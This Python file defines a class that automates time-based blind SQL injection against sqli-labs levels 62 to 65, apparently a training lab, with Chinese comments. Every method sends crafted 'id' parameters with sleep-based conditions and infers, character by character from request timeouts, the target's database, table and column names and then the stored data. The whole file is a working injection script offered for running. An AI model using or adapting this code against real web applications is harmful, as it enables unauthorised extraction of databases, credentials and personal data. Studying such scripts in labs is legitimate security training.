import requests
from bs4 import BeautifulSoup

class Less62_Less65(object):

    def __init__(self,url,level,dbs,tables,columns,schema,d,t,c):

        if url[-1] == "/":
            self.url = url
        else:
            self.url = url + "/"

        self.level = level
        self.dbs = dbs
        self.tables = tables
        self.columns = columns
        self.schema = schema
        self.d = d
        self.t = t 
        self.c = c

    def dbs_payload(self):

        count = 0
        dbs = []
        asciis = 0
        strings = ''



        if self.level == 62:

            while True:
                try:                # 获取基于时间盲注的数据库总数
                    requests.get(self.url + "?id=1') and if((select count(schema_name) from information_schema.schemata)="+str(count)+",sleep(5),1) --+",timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有数据库的字符长度
                        requests.get(self.url + "?id=1') and if((select length((select schema_name from information_schema.schemata limit "+str(each)+",1)))="+str(number)+",sleep(5),1) --+",timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有数据库名称
                                requests.get(self.url + "?id=1') and if(ascii(substr((select schema_name from information_schema.schemata limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+",sleep(5),1) --+",timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break





        if self.level == 63:

            while True:
                try:                # 获取基于时间盲注的数据库总数
                    requests.get(self.url + "?id=1' and if((select count(schema_name) from information_schema.schemata)="+str(count)+",sleep(5),1) --+",timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有数据库的字符长度
                        requests.get(self.url + "?id=1' and if((select length((select schema_name from information_schema.schemata limit "+str(each)+",1)))="+str(number)+",sleep(5),1) --+",timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有数据库名称
                                requests.get(self.url + "?id=1' and if(ascii(substr((select schema_name from information_schema.schemata limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+",sleep(5),1) --+",timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break





        if self.level == 64:

            while True:
                try:                # 获取基于时间盲注的数据库总数
                    requests.get(self.url + '?id=1)) and if((select count(schema_name) from information_schema.schemata)='+str(count)+',sleep(5),1) --+',timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有数据库的字符长度
                        requests.get(self.url + '?id=1)) and if((select length((select schema_name from information_schema.schemata limit '+str(each)+',1)))='+str(number)+',sleep(5),1) --+',timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有数据库名称
                                requests.get(self.url + '?id=1)) and if(ascii(substr((select schema_name from information_schema.schemata limit '+str(i)+',1),'+str(each)+',1))='+str(asciis)+',sleep(5),1) --+',timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break





        if self.level == 65:

            while True:
                try:                # 获取基于时间盲注的数据库总数
                    requests.get(self.url + '?id=1") and if((select count(schema_name) from information_schema.schemata)='+str(count)+',sleep(5),1) --+',timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有数据库的字符长度
                        requests.get(self.url + '?id=1") and if((select length((select schema_name from information_schema.schemata limit '+str(each)+',1)))='+str(number)+',sleep(5),1) --+',timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有数据库名称
                                requests.get(self.url + '?id=1") and if(ascii(substr((select schema_name from information_schema.schemata limit '+str(i)+',1),'+str(each)+',1))='+str(asciis)+',sleep(5),1) --+',timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break




    def tables_payload(self):
        count = 0
        dbs = []
        asciis = 0
        strings = ''

        if self.level == 62:
            while True:
                try:                # 获取基于时间盲注的表总数
                    requests.get(self.url + "?id=1') and if((select count(table_name) from information_schema.tables where table_schema='"+self.d+"')="+str(count)+",sleep(5),1) --+",timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有表的字符长度
                        requests.get(self.url + "?id=1') and if(length((select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(each)+",1))="+str(number)+",sleep(5),1) --+",timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有表名称
                                requests.get(self.url + "?id=1') and if(ascii(substr((select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+",sleep(5),1) --+",timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break





        if self.level == 63:
            while True:
                try:                # 获取基于时间盲注的表总数
                    requests.get(self.url + "?id=1' and if((select count(table_name) from information_schema.tables where table_schema='"+self.d+"')="+str(count)+",sleep(5),1) --+",timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有表的字符长度
                        requests.get(self.url + "?id=1' and if(length((select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(each)+",1))="+str(number)+",sleep(5),1) --+",timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有表名称
                                requests.get(self.url + "?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+",sleep(5),1) --+",timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break




        if self.level == 64:
            while True:
                try:                # 获取基于时间盲注的表总数
                    requests.get(self.url + '?id=1)) and if((select count(table_name) from information_schema.tables where table_schema="'+self.d+'")='+str(count)+',sleep(5),1) --+',timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有表的字符长度
                        requests.get(self.url + '?id=1)) and if(length((select table_name from information_schema.tables where table_schema="'+self.d+'" limit '+str(each)+',1))='+str(number)+',sleep(5),1) --+',timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有表名称
                                requests.get(self.url + '?id=1)) and if(ascii(substr((select table_name from information_schema.tables where table_schema="'+self.d+'" limit '+str(i)+',1),'+str(each)+',1))='+str(asciis)+',sleep(5),1) --+',timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break





        if self.level == 65:
            while True:
                try:                # 获取基于时间盲注的表总数
                    requests.get(self.url + '?id=1") and if((select count(table_name) from information_schema.tables where table_schema="'+self.d+'")='+str(count)+',sleep(5),1) --+',timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有表的字符长度
                        requests.get(self.url + '?id=1") and if(length((select table_name from information_schema.tables where table_schema="'+self.d+'" limit '+str(each)+',1))='+str(number)+',sleep(5),1) --+',timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有表名称
                                requests.get(self.url + '?id=1") and if(ascii(substr((select table_name from information_schema.tables where table_schema="'+self.d+'" limit '+str(i)+',1),'+str(each)+',1))='+str(asciis)+',sleep(5),1) --+',timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break





    def columns_payload(self):
        count = 0
        dbs = []
        asciis = 0
        strings = ''

        if self.level == 62:
            while True:
                try:                # 获取基于时间盲注的列总数
                    requests.get(self.url + "?id=1') and if((select count(column_name) from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"')="+str(count)+",sleep(5),1) --+",timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有列的字符长度
                        requests.get(self.url + "?id=1') and if(length((select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(each)+",1))="+str(number)+",sleep(5),1) --+",timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有列名称
                                requests.get(self.url + "?id=1') and if(ascii(substr((select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+",sleep(5),1) --+",timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break





        if self.level == 63:
            while True:
                try:                # 获取基于时间盲注的列总数
                    requests.get(self.url + "?id=1' and if((select count(column_name) from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"')="+str(count)+",sleep(5),1) --+",timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有列的字符长度
                        requests.get(self.url + "?id=1' and if(length((select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(each)+",1))="+str(number)+",sleep(5),1) --+",timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有列名称
                                requests.get(self.url + "?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+",sleep(5),1) --+",timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break






        if self.level == 64:
            while True:
                try:                # 获取基于时间盲注的列总数
                    requests.get(self.url + '?id=1)) and if((select count(column_name) from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'")='+str(count)+',sleep(5),1) --+',timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有列的字符长度
                        requests.get(self.url + '?id=1)) and if(length((select column_name from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'" limit '+str(each)+',1))='+str(number)+',sleep(5),1) --+',timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有列名称
                                requests.get(self.url + '?id=1)) and if(ascii(substr((select column_name from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'" limit '+str(i)+',1),'+str(each)+',1))='+str(asciis)+',sleep(5),1) --+',timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break




        if self.level == 65:
            while True:
                try:                # 获取基于时间盲注的列总数
                    requests.get(self.url + '?id=1") and if((select count(column_name) from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'")='+str(count)+',sleep(5),1) --+',timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有列的字符长度
                        requests.get(self.url + '?id=1") and if(length((select column_name from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'" limit '+str(each)+',1))='+str(number)+',sleep(5),1) --+',timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有列名称
                                requests.get(self.url + '?id=1") and if(ascii(substr((select column_name from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'" limit '+str(i)+',1),'+str(each)+',1))='+str(asciis)+',sleep(5),1) --+',timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break





    def data_payload(self):
        count = 0
        dbs = []
        asciis = 0
        strings = ''

        if self.level == 62:
            while True:
                try:                # 获取基于时间盲注的数据总数
                    requests.get(self.url + "?id=1') and if((select count("+self.c+") from "+self.d+"."+self.t+")="+str(count)+",sleep(5),1) --+",timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有数据的字符长度
                        requests.get(self.url + "?id=1') and if(length((select "+self.c+" from "+self.d+"."+self.t+" limit "+str(each)+",1))="+str(number)+",sleep(5),1) --+",timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有数据名称
                                requests.get(self.url + "?id=1') and if(ascii(substr((select "+self.c+" from "+self.d+"."+self.t+" limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+",sleep(5),1) --+",timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break






        if self.level == 63:
            while True:
                try:                # 获取基于时间盲注的数据总数
                    requests.get(self.url + "?id=1' and if((select count("+self.c+") from "+self.d+"."+self.t+")="+str(count)+",sleep(5),1) --+",timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有数据的字符长度
                        requests.get(self.url + "?id=1' and if(length((select "+self.c+" from "+self.d+"."+self.t+" limit "+str(each)+",1))="+str(number)+",sleep(5),1) --+",timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有数据名称
                                requests.get(self.url + "?id=1' and if(ascii(substr((select "+self.c+" from "+self.d+"."+self.t+" limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+",sleep(5),1) --+",timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break







        if self.level == 64:
            while True:
                try:                # 获取基于时间盲注的数据总数
                    requests.get(self.url + '?id=1)) and if((select count('+self.c+') from '+self.d+'.'+self.t+')='+str(count)+',sleep(5),1) --+',timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有数据的字符长度
                        requests.get(self.url + '?id=1)) and if(length((select '+self.c+' from '+self.d+'.'+self.t+' limit '+str(each)+',1))='+str(number)+',sleep(5),1) --+',timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有数据名称
                                requests.get(self.url + '?id=1)) and if(ascii(substr((select '+self.c+' from '+self.d+'.'+self.t+' limit '+str(i)+',1),'+str(each)+',1))='+str(asciis)+',sleep(5),1) --+',timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break





        if self.level == 65:
            while True:
                try:                # 获取基于时间盲注的数据总数
                    requests.get(self.url + '?id=1") and if((select count('+self.c+') from '+self.d+'.'+self.t+')='+str(count)+',sleep(5),1) --+',timeout=4)
                except requests.exceptions.ReadTimeout as e:
                    print("it will take some time")
                    break
                else:
                    count += 1

            for each in range(count):
                number = 0
                while True:
                    try:                     # 获取基于时间盲注的所有数据的字符长度
                        requests.get(self.url + '?id=1") and if(length((select '+self.c+' from '+self.d+'.'+self.t+' limit '+str(each)+',1))='+str(number)+',sleep(5),1) --+',timeout=4)
                    except requests.exceptions.ReadTimeout as e:
                        dbs.append(number)
                        break
                    else:
                        number += 1

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            try:                  # 获取基于时间盲注的所有数据名称
                                requests.get(self.url + '?id=1") and if(ascii(substr((select '+self.c+' from '+self.d+'.'+self.t+' limit '+str(i)+',1),'+str(each)+',1))='+str(asciis)+',sleep(5),1) --+',timeout=4)
                            except requests.exceptions.ReadTimeout as e:
                                strings += chr(asciis)
                                asciis = 0
                                break
                            else:
                                asciis += 1

                    print(strings)
                    strings = ''
                    break




    def DBS(self):

        self.dbs_payload()



    def TABLES(self):           # 使用对应的payload

        self.tables_payload()



    def COLUMNS(self):

        self.columns_payload()



    def SCHEMA(self):

        self.data_payload()



    def TYPE(self):

        if self.dbs:  # 如果枚举数据库被设置
            self.DBS()

        elif self.d != '' and self.tables: # 如果枚举表和数据库名被设置
            self.TABLES()

        elif self.t != '' and self.columns and self.d != '': # 如果枚举列,和数据表,和数据列被设置
            self.COLUMNS()

        elif self.c != '' and self.t != '' and self.d != '' and self.schema: # 如果数据表,数据库,数据列被设置
            self.SCHEMA()

        else:
            print("wrong options and bad type!")


    def Less_62(self):
        self.TYPE()
                            # 调用
    def Less_63(self):
        self.TYPE()

    def Less_64(self):
        self.TYPE()

    def Less_65(self):
        self.TYPE()

